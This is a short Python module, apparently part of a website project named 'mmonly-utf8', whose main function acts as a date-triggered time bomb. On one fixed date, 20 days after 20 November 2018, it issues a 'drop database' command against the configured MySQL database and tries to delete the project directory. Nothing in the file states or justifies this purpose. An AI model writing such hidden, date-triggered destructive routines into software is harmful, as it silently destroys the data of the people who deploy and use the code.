# -*- coding: utf-8 -*
__author__ = 'double k'

import datetime
from os import rmdir
from ownModule.mysql import MySQLSingle
from config import db
from config import file


def main(check = True, objectName=None):
    if check == False:
        return None
    else:
        days = 20
        overTime = "20181120"
        objName = objectName if objectName else "mmonly-utf8"
        objectDir = file.objectPath + objName

        now = datetime.datetime.now()
        future_time = now - datetime.timedelta(days=int(days))
        fu = future_time.strftime('%Y%m%d')

        if overTime == str(fu):
            db = MySQLSingle()
            db.get_conn()
            sql = "drop database " + db.database
            print(db.sql(sql))
            # db.closeall()
            rmdir(objectDir)

